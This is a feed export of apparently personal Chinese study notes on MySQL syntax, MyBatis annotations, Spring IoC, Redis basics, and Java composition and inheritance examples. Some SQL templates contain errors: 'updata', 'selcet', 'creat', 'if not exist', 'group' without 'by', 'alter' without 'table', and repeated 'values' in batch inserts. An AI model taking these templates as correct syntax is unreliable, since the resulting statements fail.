Language</td><td>数据定义语言，用来定义数据库对象（数据库与，表，字段）</td></tr><tr><td>DML</td><td>Data Manipulation Language</td><td>数据操作语言，用来对数据库表中的数据进行增删改</td></tr><tr><td>DQL</td><td>Data Query Language</td><td>数据查询语言，用来查询数据库表中的数据</td></tr><tr><td>DCL</td><td>Data Control Language</td><td>数据控制语言，用来创建数据库用户，控制数据库的访问权限</td></tr></tbody></table></li></ul><h3 id="02-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1-ddl" tabindex="-1">02 数据库设计-DDL</h3><ul><li><p>DDL 数据库操作</p><ul><li>查询：<ul><li>查询所有数据库：<code>show databases</code></li><li>查询当前数据库：<code>select database()</code></li></ul></li><li>使用<ul><li>使用数据库：<code>use 数据库名</code></li></ul></li><li>创建<ul><li>创建数据库：<code>create database [if not exist] 数据库名</code></li></ul></li><li>删除<ul><li>删除数据库：<code>drop database [if exists] 数据库名</code></li></ul></li></ul></li><li><p>用命令行使用mysql语句的缺点</p><ul><li>无提示，操作繁琐，无历史记录</li><li>因此可以使用mysql的可视化工具，有<ul><li>SQLyog，Navicat，DataGrip</li></ul></li><li>这里使用DataGrip，其为Jetbrains旗下的一款数据库管理工具，是管理和开发MySQL，Oracle，PostgreSQL的理想解决方案</li><li>DataGrip为IDEA自带，（IDEA贵有贵的道理）</li></ul></li><li><p>DDL表（创建，查询，修改，删除）</p></li><li><p>创建</p><pre><code class="language-SQL">create table 表名(  字段1 字段类型 [约束][comment 字段1注释]  ...  字段n 字段类型 [约束][comment 字段n注释])[comment 表注释]</code></pre><ul><li><p>约束</p><ul><li>概念：约束是作用表中字段上的规则，用于限制存储在表中的数据</li><li>目的：保证数据库中数据的正确性，有效性，完整性</li><li>SQL语句主要提供以下5种约束</li></ul><table><thead><tr><th>约束</th><th>描述</th><th>关键字</th></tr></thead><tbody><tr><td>非空约束</td><td>限制该字段值不能为null</td><td>not null</td></tr><tr><td>唯一约束</td><td>保证字段的所有数据都是唯一，不重复的</td><td>unique</td></tr><tr><td>主键约束</td><td>主键是一行数据的唯一标识，要求非空且唯一</td><td>primary key (auto_increment 设置自动增长)</td></tr><tr><td>默认约束</td><td>保存数据时，如果未指定该字段，则使用默认值</td><td>default</td></tr><tr><td>外键约束</td><td>让两张表的数据建立连接，保证数据的一致性和完整性</td><td>foreign key</td></tr></tbody></table></li><li><p>数据类型：主要分为三类</p><ul><li>数值类型：主要使用 tinyint,int,float,double</li><li>字符串类型:char(定长字符，性能高)，varchar(边长字符，性能低但占空间少)</li><li>日期时间类型</li></ul></li><li><p>表结构设计基本流程</p><ul><li>页面原型+需求 -&gt; 原型字段(类型，约束) + 基础字段（创建时间，上一次更改时间）-&gt; 得到需要的表</li></ul></li></ul></li><li><p>查询</p><ul><li>查询当前数据库的所有表：<code>show tables</code></li><li>查询表结构：<code>desc 表名</code></li><li>查询建表语句：<code>show create table 表名</code></li></ul></li><li><p>修改</p><ul><li>添加字段：<code>alter 表名 add 字段名 类型(长度) [comment 注释][约束]</code></li><li>修改字段类型：<code>alter table 表名 modify 字段名 新数据类型(长度)</code></li><li>修改字段名和字段类型：<code>alter table 表名 change 旧字段名 新字段名(长度)[comment 注释][约束]</code></li><li>删除字段：<code>alter table 表名 drop column 字段名</code></li><li>修改表明：<code>rename table 表名 to 新表名</code></li></ul></li><li><p>删除</p><ul><li>删除表： <code>drop table [if exists] 表名</code></li><li>在删除表的首，表中的数据也会删除</li></ul></li></ul><h3 id="03-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1-dml" tabindex="-1">03 数据库设计-DML</h3><p>DML（Data Manipulation Language） 数据操作语言，用来对数据库表中的数据进行增删改操作</p><ul><li><p>insert 插入</p><ul><li>语法<ul><li>指定字段添加数据：<code>insert 表名 (字段名1，字段名2) values (值1，值2)</code></li><li>全部字段添加数据：<code>insert 表名 values(值1，值2)</code></li><li>批量添加数据（指定字段）<code>insert 表名 (字段名1，字段名2) values (值1，值2),values (值1，值2)</code></li><li>鼻梁添加数据（全部字段）<code>insert 表名 values(值1，值2),values(值1，值2)</code></li></ul></li><li>注意事项<ul><li><ol><li>插入数据时，指定的字段顺序需要和值的顺序是一一对应的</li></ol></li><li><ol start="2"><li>字符串和日期类型数据应该包含在引号里</li></ol></li><li><ol start="3"><li>插入的数据大小，应该在字段的规定范围内</li></ol></li></ul></li></ul></li><li><p>update 更新</p><ul><li>语法<ul><li>修改数据：<code>updata 表名 set 字段值1=值1,字段值2=值2,...[where 条件]</code></li></ul></li><li>注意事项<ul><li>修改语句的条件可有可无，如无，则会修改整张表</li></ul></li></ul></li><li><p>delete 删除</p><ul><li>语法<ul><li>删除数据:<code>delete from 表名 [where 条件]</code></li></ul></li><li>注意事项<ul><li><ol><li>DELETE语句的条件可有可无，若没有则会删除整张表</li></ol></li><li><ol start="2"><li>DELETE语句不能删除某一个字段的值(如果操作，可以使用UPDATE，将该字段值置为NULL)</li></ol></li></ul></li></ul></li></ul><h3 id="04-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1-dql" tabindex="-1">04 数据库设计-DQL</h3><ul><li><p>DQL（Data Query Language）（数据查询语言），用来查询数据库表中的数据</p></li><li><p>关键词 SELECT</p><ul><li>语法：<br><img src="/images/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/DQL0.jpg" alt="DQL语法"></li></ul></li><li><p>基本查询</p><ul><li>查询多个字段：<code>selcet 字段1,字段2,字段3 from 表名</code></li><li>查询所有字段（通配符）：<code>select * from 表名</code>(该方法不直观，且效率低)</li><li>设置别名：<code>select 字段1 [as 别名1], 字段2 [as 别名2] from 表名</code></li><li>去除重复记录：<code>select distinct 字段列表 from 表名</code></li></ul></li><li><p>条件查询</p><ul><li>语法：<code>select 字段列表 from 表名 where 条件列表</code></li><li>比较运算符：<code>&gt;,&gt;=,&lt;,&lt;=,=,&lt;&gt;或!=(不等于),between ... and ..., in(...),like (字符串和占位符),is null </code></li><li>逻辑运算符：<code>and或&amp;&amp;,or或||,not或!</code></li></ul></li><li><p>分组查询</p><ul><li>聚合函数<ul><li>介绍：将一列数据作为一个整体，并进行纵向计算</li><li>语法：<code>select 聚合函数(字段列表) from 表名</code></li><li>常见聚合函数<code>count,max,min,avg,sum</code></li><li>注意事项：null不参与聚合函数</li></ul></li><li>语法：<ul><li>分组查询：<code>select 字段列表 from 表名 [where 条件]  group 分组字段名 [having 分组过滤后的条件]</code></li></ul></li><li>where和having区别<ul><li><ol><li>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组之后对结果进行过滤</li></ol></li><li><ol start="2"><li>判断条件不同：where不能对聚合函数进行判断，而having可以</li></ol></li></ul></li><li>注意事项：<ul><li>分组后，查询的字段为分组字段和聚合函数，查询其它字段无意义</li><li>执行顺序：where&gt;聚合函数&gt;having</li></ul></li></ul></li><li><p>排序查询</p><ul><li>语法：<ul><li>条件查询：<code>select 字段列表 from 表名 [where 条件列表][group by 分组字段] order by 字段1 排序方式1, 字段2 排序方式2...;</code></li></ul></li><li>排序方式<ul><li><code>ASC</code>升序（默认值），<code>DESC</code>降序</li></ul></li></ul></li><li><p>分页查询</p><ul><li>语法：<code>select 字段列表 from 表名 limit 起始索引,查询记录数</code></li><li>注意事项：<ul><li><ol><li>起始索引从0开始，起始索引=(查询页码-1)*每页显示记录数</li></ol></li><li><ol start="2"><li>分页查询是数据库的方言，不同数据库实现不同</li></ol></li><li><ol start="3"><li>如果查询的数据是第一页的数据，起始索引可以省略</li></ol></li></ul></li></ul></li><li><p>函数</p><ul><li><code>if(表达式,tvalue,fvalue)</code>:当表达式为true时，取tvalue，否则取fvalue</li><li><code>case expr when value1 then result1 [when value2 then result2..][else result] end</code> 类似switch语句</li></ul></li></ul><h3 id="05-%E5%A4%9A%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">05 多表设计</h3><ul><li><p>一对多</p><ul><li>使用外键约束，保证数据的一致性和完整性</li><li>外键语法：</li></ul><pre><code class="language-sql"># 创建时添加外键create table 表名(  字段民 数据类型,  ...  [constraint] [外键名称] foreign key (外键字段名) references 主表 (字段名));# 创建后添加外键alter table 表名 add constraint 外键名称 foreign key (外键字段名) references 主表(字段名) </code></pre><ul><li>物理外键<ul><li>概念：使用<code>foreign key</code>定义外键关联另一张表</li><li>缺点：<ul><li>影响增删改的效率（需要查外键关系）</li><li>仅用于单节点数据库，不适用于分布式，集群场景</li><li>容易引发数据库的死锁问题，消耗性能</li></ul></li><li>引起缺点在企业中已经很少使用，甚至明文禁止</li></ul></li><li>逻辑外键<ul><li>概念：在业务层逻辑，解决外键连接</li><li>通过逻辑外键，可以很方便解决</li></ul></li></ul></li><li><p>一对一</p><ul><li>关系：一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其它字段放在另一张表中，以提升效率</li><li>实现：在任意一方加入外键，关联另一方的主键，并且设置外键为唯一的。</li></ul></li><li><p>多对多</p><ul><li>关系：一个学生可以选多个课程，一个课程可供多个学生选择</li><li>实现：建立第三张表，中间表至少包含两个外键，分别关联两方主键</li></ul></li></ul><h3 id="06-%E5%A4%9A%E8%A1%A8%E6%9F%A5%E8%AF%A2" tabindex="-1">06 多表查询</h3><ul><li><p>概念：从多个表中查询数据</p><ul><li>笛卡尔积</li><li>内连接</li><li>外连接<ul><li>左外连接：查询左表所有数据（包括两张表交集部分数据）</li><li>右外连接：查询右表所有数据（包括两张表交集部分数据）</li></ul></li><li>子查询</li></ul></li><li><p>内连接</p><ul><li>语法<ul><li>隐式内连接：<code>select 字段列表 from 表1,表2 where 条件 ...;</code></li><li>显式内连接：<code>select 字段列表 from 表1 [inner] join 表2 on 条件;</code></li></ul></li></ul></li><li><p>左外连接：<code>select 字段列表 from 表1 left [outer] join 表2 on 连接条件</code></p></li><li><p>左外连接：<code>select 字段列表 from 表1 right [outer] join 表2 on 连接条件</code></p></li><li><p>子查询</p><ul><li>介绍：SQL语句种嵌套select语句，称为嵌套查询，又称子查询</li><li>形式：<code>select * from t1 where column1 = (select column1 from t2 ..)</code></li><li>子查询外部的语句可以是insert/update/delete/select的任何一个，最常见的是select</li><li>分类<ul><li>标量子查询，列子查询，行子查询，表子查询</li></ul></li></ul></li></ul><h3 id="07-%E4%BA%8B%E5%8A%A1" tabindex="-1">07 事务</h3><ul><li>介绍<ul><li>概念：事务是一组操作集合，他是一个不可分割的工作单位。事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败</li><li>注意事项：默认MySQL的事务是自动提交的，即当执行依据DML语句，MySQL会立即隐式地提交事务</li></ul></li><li>事务控制<ul><li>开启事务：<code>start transaction; / begin</code></li><li>提交事务：<code>commit</code></li><li>回归事务：<code>rollback</code></li></ul></li><li>事务四大特性<ul><li>原子性Atomicity  ：事务是不可分割的最小单位，要么全部成功，要么全部失败</li><li>一致性Consistency：事务完成时，必须使所有的数据都保持一致性</li><li>隔离性Isolation  ：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行</li><li>持久性Durability ：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。</li></ul></li></ul><h3 id="08-%E7%B4%A2%E5%BC%95" tabindex="-1">08 索引</h3><ul><li><p>概念：帮助数据库高效获取数据的数据结构</p></li><li><p>优点：</p><ul><li>提高数据查询效率，降低数据库IO成本</li><li>通过索引列对数据进行排序，降低数据排序成本，降低CPU消耗</li></ul></li><li><p>缺点</p><ul><li>索引会占据存储空间</li><li>索引大大提高了查询效率，但降低了增删改的效率</li><li>然而缺点影响不大，当今企业存储空间已经不是问题，且一个正常的数据库系统90%是查询操作</li></ul></li><li><p>结构</p><ul><li>MySQL数据库支持的索引结构很多，如：hash索引，B+Tree索引，Full-Text索引等。但MySQL默认索引为B+Tree结果组织的索引。</li></ul></li><li><p>语法</p><ul><li>创建索引：<code>creat [unique] index 索引名 on 表名(字段名)</code></li><li>查看索引：<code>show index from 表名</code></li><li>删除索引：<code>drop index 索引名 on 表名</code></li></ul></li><li><p>注意事项：</p><ul><li>主键字段，在建表时，会自动创建主键索引</li><li>添加唯一约束时，数据库实际上会添加唯一索引</li></ul></li></ul><h2 id="mybaits" tabindex="-1">MyBaits</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=116&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">课程连接</a></p><ul><li>Mybaits是一款优秀的持久层（即三层中的第三层）框架，用于简化JDBC的开发</li><li></li></ul><h3 id="01-mybatis%E5%85%A5%E9%97%A8" tabindex="-1">01 Mybatis入门</h3><ul><li><p>使用Mybatis查询所有用户数据</p><ul><li>1 准备工作（创建springboot工程，数据库表user，实体类User）</li><li>2 引入Mybatis的相关依赖，配置Mybaits(数据库连接信息)</li><li>3 编写SQL语句（注解/XML）</li></ul></li><li><p>配置SQL提示</p></li><li><p>JDBC（Java DataBase Connectivity）,就是使用Java语言操作关系型数据库的一套API</p><ul><li>本质<ul><li>sun公司官方定义的一套操作所用关系型数据的规范，即接口</li><li>各个数据库厂商去实现这套接口，提供数据库的驱动jar包</li><li>使用这套接口编程，真正执行的是驱动jar包中的代码</li></ul></li></ul></li><li><p>数据库连接池</p><ul><li>概念<ul><li>数据库连接池是一个容器，负责分配，管理数据库连接</li><li>允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个</li><li>释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏</li></ul></li><li>优势<ul><li>资源重用</li><li>提升系统响应速度</li><li>避免数据库连接遗漏</li></ul></li><li>便准接口：DataSource<ul><li>官方sun提供的供数据库连接池接口，由第三方组织实现该接口</li><li>功能：获取连接</li></ul></li></ul></li><li><p>lombok</p><ul><li>定义：Lombok是一个实用的java类库，能通过注解的形式自动生成构造器getter/setter,equals,hashcode,toString等方法，并可以自动化生成日志变量，简化java开发，提高效率</li></ul><table><thead><tr><th>注解</th><th>作用</th></tr></thead><tbody><tr><td>@Getter/@Setter</td><td>为所有属性提供get/set方法</td></tr><tr><td>@ToString</td><td>会给类自动生成易读的toString方法</td></tr><tr><td>@EqualsAndHashCode</td><td>根据类所拥有的非静态字段自动重写equals方法和hashcode方法</td></tr><tr><td>@Data</td><td>提供了更综合的生成代码功能（包含以上四个方法）</td></tr><tr><td>@NoArgsConstructor</td><td>为实体类生成无参的构造器方法</td></tr><tr><td>@AllArgsConstructor</td><td>为实体类生成除static修饰的字段之外带有各参数的构造器方法</td></tr></tbody></table></li></ul><h3 id="02-mybatis%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C" tabindex="-1">02 Mybatis基础操作</h3><ul><li><p>准备</p></li><li><p>删除</p><ul><li>SQL语句：<code>delete from emp where id=17</code></li><li>接口方法：</li></ul><pre><code class="language-java">@Delete(&quot;delete from emp where id=#&#123;id&#125;&quot;)//也可以是@Delete(&quot;delete from emp where id=$&#123;id&#125;&quot;)//但#&#123;&#125;为预编译，$&#123;&#125;为直接嵌入public void delete(Integer id);</code></pre><ul><li>如果mapper接口方法形参只有一个普通类型的参数，#{…}里面的属性名可以随便写，否则要对应</li><li>日志输出：再application.properties中配置<code>mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</code>，打开mybatis日志，并指定输出到控制台中</li><li>预编译<ul><li>性能更高</li><li>更安全（防止SQL注入 ）<ul><li>sQL注入：通过操作输入的数据来修改实现定义好的SQL语句，以达到执行代码对服务器进行攻击的方法</li></ul></li></ul></li></ul></li><li><p>新增</p><ul><li>SQL语句</li></ul><pre><code class="language-sql">insert into emp(username, name, gender, image, job, entrydate, dept_id, create_time, update_time)    values ('Tom','汤姆','1','1.jpg',1,'2005-01-01',1,now(),now())</code></pre><ul><li>接口方法</li></ul><pre><code class="language-java">@Options(useGeneratedKeys = true,keyProperty = &quot;id&quot;)//该注解可以返回生成的主键，默认是不返回的@Insert(&quot;insert into emp(username, name, gender, image, job, entrydate, dept_id, create_time, update_time)&quot; +          &quot; values (#&#123;username&#125;,#&#123;name&#125;,#&#123;gender&#125;,#&#123;image&#125;,#&#123;job&#125;,#&#123;entrydate&#125;,#&#123;deptId&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&quot;)  public void insert(Emp emp);</code></pre></li><li><p>更新</p><ul><li>SQL语句</li></ul><pre><code class="language-sql">update emp set username='',name='',gender='',image='',job='',entrydate='',dept_id='',create_time='',update_time='' where id=1;</code></pre><ul><li>接口方法</li></ul><pre><code class="language-java">@Update(&quot;update emp set username=#&#123;username&#125;,name=#&#123;name&#125;,gender=#&#123;gender&#125;,image=#&#123;image&#125;,&quot;+&quot;job=#&#123;job&#125;,entrydate=#&#123;entrydate&#125;,dept_id=#&#123;deptId&#125;,update_time=#&#123;updateTime&#125; where id=#&#123;id&#125;&quot;)  public void update(Emp emp);</code></pre></li><li><p>查询</p><ul><li>SQL语句：<code>select * from emp where id=15</code></li><li>接口方法：</li></ul><pre><code class="language-java">@Select(&quot;select * from emp where id=#&#123;id&#125;&quot;)  public Emp getById(Integer id);</code></pre><ul><li>mybatis数据封装<ul><li>实体类属性名和数据库表查询返回的字段名一致，mybatis会自动封装</li><li>不一致时解决方案：<ul><li><ol><li>在sql语句中起别名</li></ol></li><li><ol start="2"><li>通过<code>@Results,@Result</code>注解手动映射</li></ol></li><li><ol start="3"><li>通过mybaits的驼峰命名自动映射开关</li></ol></li></ul></li></ul></li></ul></li><li><p>条件查询</p><ul><li>SQL语句</li></ul><pre><code class="language-sql">select * from emp where name like '%张%' and gender = 1 and entrydate between '2010-01-01' and '2020-01-01' order by update_time desc</code></pre><ul><li>接口方法</li></ul><pre><code class="language-java">@Select(&quot;select * from emp where name like concat('%',#&#123;name&#125;,'%') and gender = #&#123;gender&#125; and &quot; +  &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)  public List&lt;Emp&gt; list(String name, short gender, LocalDate begin,LocalDate end);</code></pre></li></ul><h3 id="03-xml%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6" tabindex="-1">03 XML映射文件</h3><p>//之后在本次突击还没用到，以后闲了看看</p><h3 id="04-mybatis%E5%8A%A8%E6%80%81sql" tabindex="-1">04 Mybatis动态SQL</h3><h2 id="spring" tabindex="-1">Spring</h2><p>Spring技术是JavaEE开发必备技能，企业开发技术选型命中率&gt;90%</p><ul><li><p>简化开发，降低企业级开发的复杂性</p></li><li><p>框架整合，高效整合其它技术，提高企业级应用开发和运行效率</p></li><li><p>学什么？</p><ul><li>IoC</li><li>AOP</li><li>事务处理</li><li>框架整合</li></ul></li><li><p>怎么学？</p><ul><li>学习Spring框架的设计思想</li><li>学习基础操作，思考操作与思想间的联系</li><li>学习案例，熟练应用操作的同时，体会思想</li></ul></li></ul><h3 id="1-spring-%E5%88%9D%E8%AF%86" tabindex="-1">1 Spring 初识</h3><ul><li>Spring 既是一门技术，也是一套项目，已经形成了开发的生态圈，Spring 全家桶</li><li>包含重点：<ul><li>Spring Framework：基础框架，全家桶所有都基于此</li><li>Spring Boot：Spring开发已经更简单，该技术让Spring开发更迅速</li><li>Spring Cloud：提供分布式开发相关技术</li></ul></li></ul><h3 id="2-spring-framework" tabindex="-1">2 Spring Framework</h3><ul><li>该项目为Spring生态圈最基础的项目<br><img src="/images/web/spring/Spring4.0%E6%9E%B6%E6%9E%84%E5%9B%BE.jpg" alt="Spring4.0架构图"></li><li>然而该架构配置繁琐，入门难度大</li><li>为此推出Spring Boot 简化配置和快速开发</li></ul><h3 id="3-spring-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5" tabindex="-1">3 Spring 核心概念</h3><ul><li><p>Ioc/DI</p></li><li><p>IoC容器</p></li><li><p>Bean</p></li><li><p>IoC (Inversion of Control) 控制反转</p><ul><li>使用对象时，由主动new产生对象转换为由外部提供对象，此过程中对像创建控制权由程序转移到外部，此思想称为控制反转</li></ul></li><li><p>Spring技术对IoC技术进行了实现</p><ul><li>Spring提供了一个容器，称为IoC容器，用来充当IoC思想中的“外部”</li><li>IoC容器负责对象的创建，初始化等一系列工作，被创建或被管理的对象再IoC容器里称为<code>Bean</code></li></ul></li><li><p>DI (Dependency Injection) 依赖注入</p><ul><li>在容器中简历bean和bean之间的依赖关系的整个过程，称为依赖注入</li></ul></li><li><p>核心概念</p><ul><li>目标：充分解耦<ul><li>使用IoC容器管理bean（IoC）</li><li>在IoC容器内将有依赖关系的bean进行关系绑定（DI）</li></ul></li><li>最终效果<ul><li>使用对象时不仅可以直接从IoC容器中获取，并且获取到的bean已经绑定了所有的依赖关系</li></ul></li></ul></li></ul><h3 id="4-ioc%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B" tabindex="-1">4 IoC入门案例</h3><ol><li>管理什么？（Service与Dao）</li><li>如何将管理的对象告知IoC容器（配置）</li><li>被管理的对象交给IoC容器，如何获取IoC容器（接口）</li><li>IoC容器得到后，如何获得其中bean（接口方法）</li><li>使用Spring导入哪些坐标（pos.xml）</li></ol><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> web </tag>
            
            <tag> IDEA </tag>
            
            <tag> spring,springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习（未完）</title>
      <link href="/2023/08/16/web/redis/"/>
      <url>/2023/08/16/web/redis/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p><a href="https://www.bilibili.com/video/BV1cr4y1671t?p=2&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><h2 id="%E5%88%9D%E8%AF%86redis" tabindex="-1">初识Redis</h2><h3 id="1-%E8%AE%A4%E8%AF%86nosql" tabindex="-1">1 认识NoSQL</h3><table><thead><tr><th></th><th>SQL(关系型数据库)</th><th>NoSQL(非关系型数据库)</th></tr></thead><tbody><tr><td>数据结构</td><td>结构化</td><td>非结构化（键值型Redis，图类型Neo4j，文档型MongoDB，列类型HBase）</td></tr><tr><td>数据关联</td><td>关联的</td><td>无关联的</td></tr><tr><td>查询方式</td><td>SQL查询</td><td>非SQL</td></tr><tr><td>事务特性</td><td>ACID</td><td>BASE（基本满足ACID）</td></tr><tr><td>存储方式</td><td>磁盘</td><td>内存</td></tr><tr><td>扩展性</td><td>垂直</td><td>水平</td></tr><tr><td>使用场景</td><td>(1)数据结构固定<br>(2)相关事务对数据安全性，一致性要求较高</td><td>(1)数据结构不固定<br>(2)对一致性，安全性要求不高<br>(3)对性能要求</td></tr></tbody></table><h3 id="2-%E8%AE%A4%E8%AF%86redis" tabindex="-1">2 认识Redis</h3><p>Redis诞生于2009年，全称 Remote Dictionary Server，远程词典服务，是一个基于内存的键值型NoSQL数据库</p><ul><li>特征<ul><li>键值型，value支持多种不同的数据结构吗，功能丰富</li><li>单线程，每个命令具有原子性</li><li>低延迟，速度快(基于内存，IO多路复用，良好的编码)</li><li>支持数据持久化</li><li>支持中主从集群，分片集群</li><li>支持多语言客户端</li></ul></li></ul><h3 id="3-%E5%AE%89%E8%A3%85redis" tabindex="-1">3 安装Redis</h3><p>只能在linux上使用，这里先简单了解一下，摸了</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>On java 8 基础卷（8-14章）</title>
      <link href="/2023/08/16/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B78-14/"/>
      <url>/2023/08/16/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B78-14/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/OnJava8/x_x.jpg" alt></p><h2 id="8-%E5%A4%8D%E7%94%A8" tabindex="-1">8 复用</h2><h3 id="8.1-%E7%BB%84%E5%90%88%E8%AF%AD%E6%B3%95" tabindex="-1">8.1 组合语法</h3><ul><li>组合:将对象引用放入新类中即可</li><li>初始化引用有以下4中方式<ul><li><ol><li>在定义时立刻初始化</li></ol></li><li><ol start="2"><li>在类的构造器中</li></ol></li><li><ol start="3"><li>在对象实际使用之前</li></ol></li><li><ol start="4"><li>使用实例初始化</li></ol></li></ul></li></ul><pre><code class="language-java">class Soap &#123;  private String s;  Soap() &#123;//2 构造器初始化    System.out.println(&quot;Soap()&quot;);    s = &quot;Constructed&quot;;  &#125;  @Override public String toString() &#123; return s; &#125;&#125;public class Bath &#123;  private String // 1. 立即初始化    s1 = &quot;Happy&quot;,    s2 = &quot;Happy&quot;,    s3, s4;  private Soap castile;  private int i;  private float toy;  public Bath() &#123;    System.out.println(&quot;Inside Bath()&quot;);    s3 = &quot;Joy&quot;;    toy = 3.14f;    castile = new Soap();  &#125;  // 实例初始化  &#123; i = 47; &#125;  @Override public String toString() &#123;    if(s4 == null) // 延迟初始化      s4 = &quot;Joy&quot;;    return      &quot;s1 = &quot; + s1 + &quot;\n&quot; +      &quot;s2 = &quot; + s2 + &quot;\n&quot; +      &quot;s3 = &quot; + s3 + &quot;\n&quot; +      &quot;s4 = &quot; + s4 + &quot;\n&quot; +      &quot;i = &quot; + i + &quot;\n&quot; +      &quot;toy = &quot; + toy + &quot;\n&quot; +      &quot;castile = &quot; + castile;  &#125;  public static void main(String[] args) &#123;    Bath b = new Bath();    System.out.println(b);  &#125;&#125;/* Output:Inside Bath()Soap()s1 = Happys2 = Happys3 = Joys4 = Joyi = 47toy = 3.14castile = Constructed*/</code></pre><h3 id="8.2-%E7%BB%A7%E6%89%BF%E8%AF%AD%E6%B3%95" tabindex="-1">8.2 继承语法</h3><ul><li>创建一个类时,如无指定继承对象,将会隐式继承标准根类Object</li><li>Java只允许单继承</li><li>继承通过关键字<code>extends</code>后跟基类实现,此时自动获得基类的所有字段和方法</li><li>通过<code>super</code>关键字,来指代当前类继承的&quot;基类&quot;的</li></ul><h4 id="%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9F%BA%E7%B1%BB" tabindex="-1">初始化基类</h4><ul><li><p>对于子类和基类,当创建子类对象时,其里面包含了一个基类的<code>子对象</code>(subobject),该子对象等同于直接创建基类对象,只是该对象被包括在子对象中</p></li><li><p>Java会自动在子类构造其中插入对基类构造器的调用<br><img src="/images/PL/OnJava8/8_2_1.png" alt></p></li><li><p>对于带参的构造器,需要使用super关键字和对应的参数列表,来显式的调用基类构造器,否则编译报错</p></li></ul><p><img src="/images/PL/OnJava8/8_2_2.png" alt></p><h3 id="8.3-%E5%A7%94%E6%89%98" tabindex="-1">8.3 委托</h3><ul><li><p>第三种关系<code>委托(delegation)</code>,介于继承和组合之间</p><ul><li>将成员对象放在构建的类中(类似组合),但同时在新类中公开了成员对象的所有方法(类似继承)</li></ul></li><li><p>例子:对于一艘太空船需要一个控制模块,这里使用继承方法,但逻辑上讲不通,而组合方法中,不能通过太空船直接掉用到控制模块的方法,此时可以使用委托</p></li><li><p>这里相当于方法调用被转发到了内部的controls对象,这里的接口与继承得到的接口相同</p><ul><li><strong>但是</strong>,这里可以更好的控制委托,因为这里可以选择仅提供成员对象的部分方法,比如控制模块的一些不能暴露给飞船控制人员的方法</li></ul></li></ul><pre><code class="language-java">public class SpaceShipDelegation &#123;  private String name;  private SpaceShipControls controls =    new SpaceShipControls();  public SpaceShipDelegation(String name) &#123;    this.name = name;  &#125;  // Delegated methods 委托方法:  public void back(int velocity) &#123;    controls.back(velocity);  &#125;  public void down(int velocity) &#123;    controls.down(velocity);  &#125;  public void forward(int velocity) &#123;    controls.forward(velocity);  &#125;  public void left(int velocity) &#123;    controls.left(velocity);  &#125;  public void right(int velocity) &#123;    controls.right(velocity);  &#125;  public void turboBoost() &#123;    controls.turboBoost();  &#125;  public void up(int velocity) &#123;    controls.up(velocity);  &#125;  public static void main(String[] args) &#123;    SpaceShipDelegation protector =      new SpaceShipDelegation(&quot;NSEA Protector&quot;);    protector.forward(100);  &#125;&#125;</code></pre><h3 id="8.4-%E7%BB%84%E5%90%88%E4%B8%8E%E7%BB%A7%E6%89%BF%E7%9B%B8%E7%BB%93%E5%90%88" tabindex="-1">8.4 组合与继承相结合</h3><h4 id="8.4.1-%E7%A1%AE%E4%BF%9D%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%B8%85%E7%90%86" tabindex="-1">8.4.1 确保正确的清理</h4><ul><li>Java中没有C++中析构函数的概念,析构函数会在对象被销毁时自动调用,而Java中有GC,会在需要时回收内存</li><li>然而,类可能需要自己执行一些清理活动,因为你不知道GC什么时候被调用,所以此时必须明确地编写一个特殊的方法来实现<ul><li>该方法与构造器方法类似,需要显式的声明,顺序与构造器顺序相反</li></ul></li></ul><pre><code class="language-java">package reuse;class Shape &#123;  Shape(int i) &#123;    System.out.println(&quot;Shape constructor&quot;);  &#125;  void dispose() &#123;    System.out.println(&quot;Shape dispose&quot;);  &#125;&#125;class Circle extends Shape &#123;  Circle(int i) &#123;    super(i);    System.out.println(&quot;Drawing Circle&quot;);  &#125;  @Override void dispose() &#123;    System.out.println(&quot;Erasing Circle&quot;);    super.dispose();  &#125;&#125;class Triangle extends Shape &#123;  Triangle(int i) &#123;    super(i);    System.out.println(&quot;Drawing Triangle&quot;);  &#125;  @Override void dispose() &#123;    System.out.println(&quot;Erasing Triangle&quot;);    super.dispose();  